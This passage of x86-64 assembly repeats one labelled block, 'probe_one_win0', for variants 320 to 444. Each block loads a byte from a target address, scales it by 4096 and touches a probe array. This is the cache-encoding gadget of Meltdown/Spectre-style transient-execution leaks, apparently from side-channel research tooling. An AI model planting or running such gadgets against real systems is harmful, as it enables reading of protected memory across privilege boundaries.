	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 320
.Lprobe_one_win0_var320:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 321
.Lprobe_one_win0_var321:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 322
.Lprobe_one_win0_var322:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 323
.Lprobe_one_win0_var323:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 324
.Lprobe_one_win0_var324:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 325
.Lprobe_one_win0_var325:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 326
.Lprobe_one_win0_var326:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 327
.Lprobe_one_win0_var327:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 328
.Lprobe_one_win0_var328:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 329
.Lprobe_one_win0_var329:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 330
.Lprobe_one_win0_var330:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 331
.Lprobe_one_win0_var331:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 332
.Lprobe_one_win0_var332:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 333
.Lprobe_one_win0_var333:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 334
.Lprobe_one_win0_var334:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 335
.Lprobe_one_win0_var335:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 336
.Lprobe_one_win0_var336:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 337
.Lprobe_one_win0_var337:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 338
.Lprobe_one_win0_var338:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 339
.Lprobe_one_win0_var339:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 340
.Lprobe_one_win0_var340:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 341
.Lprobe_one_win0_var341:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 342
.Lprobe_one_win0_var342:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 343
.Lprobe_one_win0_var343:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 344
.Lprobe_one_win0_var344:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 345
.Lprobe_one_win0_var345:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 346
.Lprobe_one_win0_var346:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 347
.Lprobe_one_win0_var347:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 348
.Lprobe_one_win0_var348:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 349
.Lprobe_one_win0_var349:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 350
.Lprobe_one_win0_var350:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 351
.Lprobe_one_win0_var351:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 352
.Lprobe_one_win0_var352:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 353
.Lprobe_one_win0_var353:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 354
.Lprobe_one_win0_var354:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 355
.Lprobe_one_win0_var355:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 356
.Lprobe_one_win0_var356:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 357
.Lprobe_one_win0_var357:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 358
.Lprobe_one_win0_var358:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 359
.Lprobe_one_win0_var359:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 360
.Lprobe_one_win0_var360:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 361
.Lprobe_one_win0_var361:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 362
.Lprobe_one_win0_var362:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 363
.Lprobe_one_win0_var363:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 364
.Lprobe_one_win0_var364:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 365
.Lprobe_one_win0_var365:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 366
.Lprobe_one_win0_var366:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 367
.Lprobe_one_win0_var367:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 368
.Lprobe_one_win0_var368:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 369
.Lprobe_one_win0_var369:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 370
.Lprobe_one_win0_var370:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 371
.Lprobe_one_win0_var371:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 372
.Lprobe_one_win0_var372:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 373
.Lprobe_one_win0_var373:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 374
.Lprobe_one_win0_var374:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 375
.Lprobe_one_win0_var375:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 376
.Lprobe_one_win0_var376:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 377
.Lprobe_one_win0_var377:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 378
.Lprobe_one_win0_var378:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 379
.Lprobe_one_win0_var379:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 380
.Lprobe_one_win0_var380:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 381
.Lprobe_one_win0_var381:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 382
.Lprobe_one_win0_var382:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 383
.Lprobe_one_win0_var383:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 384
.Lprobe_one_win0_var384:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 385
.Lprobe_one_win0_var385:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 386
.Lprobe_one_win0_var386:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 387
.Lprobe_one_win0_var387:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 388
.Lprobe_one_win0_var388:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 389
.Lprobe_one_win0_var389:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 390
.Lprobe_one_win0_var390:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 391
.Lprobe_one_win0_var391:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 392
.Lprobe_one_win0_var392:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 393
.Lprobe_one_win0_var393:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 394
.Lprobe_one_win0_var394:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 395
.Lprobe_one_win0_var395:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 396
.Lprobe_one_win0_var396:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 397
.Lprobe_one_win0_var397:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 398
.Lprobe_one_win0_var398:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 399
.Lprobe_one_win0_var399:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 400
.Lprobe_one_win0_var400:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 401
.Lprobe_one_win0_var401:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 402
.Lprobe_one_win0_var402:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 403
.Lprobe_one_win0_var403:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 404
.Lprobe_one_win0_var404:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 405
.Lprobe_one_win0_var405:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 406
.Lprobe_one_win0_var406:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 407
.Lprobe_one_win0_var407:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 408
.Lprobe_one_win0_var408:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 409
.Lprobe_one_win0_var409:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 410
.Lprobe_one_win0_var410:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 411
.Lprobe_one_win0_var411:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 412
.Lprobe_one_win0_var412:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 413
.Lprobe_one_win0_var413:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 414
.Lprobe_one_win0_var414:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 415
.Lprobe_one_win0_var415:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 416
.Lprobe_one_win0_var416:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 417
.Lprobe_one_win0_var417:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 418
.Lprobe_one_win0_var418:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 419
.Lprobe_one_win0_var419:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 420
.Lprobe_one_win0_var420:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 421
.Lprobe_one_win0_var421:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 422
.Lprobe_one_win0_var422:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 423
.Lprobe_one_win0_var423:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 424
.Lprobe_one_win0_var424:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 425
.Lprobe_one_win0_var425:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 426
.Lprobe_one_win0_var426:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 427
.Lprobe_one_win0_var427:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 428
.Lprobe_one_win0_var428:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 429
.Lprobe_one_win0_var429:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 430
.Lprobe_one_win0_var430:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 431
.Lprobe_one_win0_var431:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 432
.Lprobe_one_win0_var432:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 433
.Lprobe_one_win0_var433:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 434
.Lprobe_one_win0_var434:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 435
.Lprobe_one_win0_var435:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 436
.Lprobe_one_win0_var436:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 437
.Lprobe_one_win0_var437:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 438
.Lprobe_one_win0_var438:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 439
.Lprobe_one_win0_var439:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 440
.Lprobe_one_win0_var440:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 441
.Lprobe_one_win0_var441:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 442
.Lprobe_one_win0_var442:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 443
.Lprobe_one_win0_var443:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 444
.Lprobe_one_win0_var444:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 445
.Lprobe_one_win0_var445:
